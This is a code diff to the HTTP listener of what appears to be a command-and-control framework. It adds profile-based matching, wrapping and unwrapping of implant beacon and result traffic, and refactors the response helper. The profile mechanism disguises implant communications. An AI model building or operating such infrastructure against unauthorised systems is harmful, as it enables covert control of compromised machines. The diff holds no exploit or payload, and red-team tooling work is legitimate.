@@ -51,30 +51,46 @@ async def handle_http_client(
             )
             return
 
-        # Beacon endpoints (mirror main API)
-        if method == "POST" and path_only in (
+        # Beacon endpoints: legacy paths + active/known profile URIs
+        pe = getattr(manager, "profile_engine", None)
+        kind = ""
+        prof = None
+        if pe is not None and method == "POST":
+            kind, prof = pe.match_beacon_path(path_only)
+        elif method == "POST" and path_only in (
             "/api/v1/implant/beacon",
             "/implant/beacon",
             "/beacon",
         ):
-            data = _json_body(body)
+            kind = "beacon"
+        elif method == "POST" and path_only in (
+            "/api/v1/implant/beacon/result",
+            "/implant/beacon/result",
+            "/beacon/result",
+        ):
+            kind = "result"
+
+        if method == "POST" and kind == "beacon":
+            data = pe.unwrap_request_body(prof, body) if pe else _json_body(body)
             result = await manager.handle_beacon(
                 listener_id=listener_id,
                 remote_addr=peer[0] if peer else remote,
                 payload=data,
                 user_agent=headers.get("user-agent"),
             )
-            await _respond(writer, 200, result)
+            if pe:
+                await _respond_text(writer, 200, pe.wrap_response(prof, result), "application/json")
+            else:
+                await _respond(writer, 200, result)
             return
 
-        if method == "POST" and path_only in (
-            "/api/v1/implant/beacon/result",
-            "/implant/beacon/result",
-            "/beacon/result",
-        ):
-            data = _json_body(body)
+        if method == "POST" and kind == "result":
+            data = pe.unwrap_request_body(prof, body) if pe else _json_body(body)
             result = await manager.handle_beacon_result(data)
-            await _respond(writer, 200, result)
+            if pe:
+                await _respond_text(writer, 200, pe.wrap_response(prof, result), "application/json")
+            else:
+                await _respond(writer, 200, result)
             return
 
         # OAST / catch-all: log hit, optional lightweight session note
@@ -164,11 +180,20 @@ def _json_body(body: bytes) -> dict[str, Any]:
 
 
 async def _respond(writer: asyncio.StreamWriter, status: int, payload: dict[str, Any]) -> None:
-    body = json.dumps(payload).encode("utf-8")
+    await _respond_text(writer, status, json.dumps(payload), "application/json")
+
+
+async def _respond_text(
+    writer: asyncio.StreamWriter,
+    status: int,
+    text: str,
+    content_type: str = "application/json",
+) -> None:
+    body = text.encode("utf-8")
     reason = {200: "OK", 400: "Bad Request", 500: "Internal Server Error"}.get(status, "OK")
     header = (
         f"HTTP/1.1 {status} {reason}\r\n"
-        f"Content-Type: application/json\r\n"
+        f"Content-Type: {content_type}\r\n"
         f"Content-Length: {len(body)}\r\n"
         f"Connection: close\r\n"
         f"Server: SquidC5\r\n"
